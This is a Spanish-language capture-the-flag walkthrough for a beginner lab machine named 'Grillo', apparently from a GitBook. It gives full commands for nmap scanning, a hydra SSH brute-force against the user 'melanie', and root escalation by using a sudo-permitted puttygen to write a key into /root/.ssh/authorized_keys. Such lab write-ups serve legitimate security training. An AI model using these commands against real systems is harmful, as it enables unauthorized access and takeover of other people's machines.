---
description: '🔍 Dificultad: Principiante'
---

# Grillo

```bash
ping -c 1 192.168.1.67
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/imagen (77).png" alt=""><figcaption></figcaption></figure>

A continuación, se realiza el comando:

```bash
nmap -sVC -p- -n --min-rate 5000 192.168.1.67
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/imagen (78).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo que el **puerto 22** perteneciente al **servicio SSH** y el **puerto 80** perteneciente al **servicio HTTP** están abiertos por lo que a continuación se indagará más.

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p22,80 -v 192.168.1.67
```

para obtener más información sobre ese puerto específicamente.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2024-10-12 214807.png" alt=""><figcaption></figcaption></figure>

Seguimos indagando más sobre los puertos y ahora exploramos el servicio **HTTP**. Ingresamos la IP y nos encontramos la página por defecto de **Apache**.

<figure><img src="../../.gitbook/assets/imagen (79).png" alt=""><figcaption></figcaption></figure>

Al revisar el código fuente nos encontramos un comentario muy interesante. Nos menciona a un usuario que se llama **melanie**.

<figure><img src="../../.gitbook/assets/imagen (71).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Con la información obtenida anteriormente, realizamos el comando:

```bash
hydra -l melanie -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.67 -t 5
```

que utiliza la herramienta **Hydra** para realizar un ataque de fuerza bruta contra el servicio **SSH** de una máquina con la IP **192.168.1.67**.

<figure><img src="../../.gitbook/assets/imagen (82).png" alt=""><figcaption></figcaption></figure>

Al realizar el ataque de fuerza bruta, hemos descubierto la contraseña de **melanie**. Sabiendo esto, nos conectamos a través de **SSH** al usuario con el comando:

```bash
ssh melanie@192.168.1.67
```

<figure><img src="../../.gitbook/assets/imagen (72).png" alt=""><figcaption></figcaption></figure>

### 🔐 PRIVILEGIOS

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar.

<figure><img src="../../.gitbook/assets/imagen (73).png" alt=""><figcaption></figcaption></figure>

Primero, creamos una clave SSH utilizando puttygen, una herramienta diseñada para gestionar claves SSH en diferentes formatos.

```bash
puttygen -t rsa -o id_rsa -O private-openssh
```

Esto genera una nueva clave privada RSA, que se almacena en el archivo **id\_rsa**. También se nos pide ingresar una frase de paso para agregar una capa extra de seguridad a la clave privada.\
Después de crear la clave, utilizamos el comando `ls` para confirmar que el archivo **id\_rsa** ha sido creado exitosamente.

<figure><img src="../../.gitbook/assets/imagen (74).png" alt=""><figcaption></figcaption></figure>

Con la clave privada generada, el siguiente paso es crear la clave pública correspondiente y agregarla al archivo **authorized\_keys** del usuario root. Esto permitirá el acceso SSH sin necesidad de contraseña desde la cuenta de Melanie:

```
sudo -u root /usr/bin/puttygen id_rsa -o /root/.ssh/authorized_keys -O public-openssh
```

Antes de intentar conectarnos por SSH, modificamos los permisos de la clave privada para garantizar que solo el usuario tenga acceso de lectura:

```
chmod 600 id_rsa
```

<figure><img src="../../.gitbook/assets/imagen (75).png" alt=""><figcaption></figcaption></figure>

Finalmente, empleamos la clave privada para acceder al servidor como usuario **root**.

```bash
ssh -i id_rsa root@192.168.1.67
```

<figure><img src="../../.gitbook/assets/imagen (76).png" alt=""><figcaption></figcaption></figure>

Te deseo mucho éxito en tu búsqueda de las flags! Recuerda prestar atención a cada detalle, examinar los archivos y servicios con detenimiento, y utilizar todas las herramientas disponibles para encontrarlas. La clave para el éxito está en la perseverancia y en no dejar ningún rincón sin explorar. ¡Adelante, hacker! 💻🔍🚀
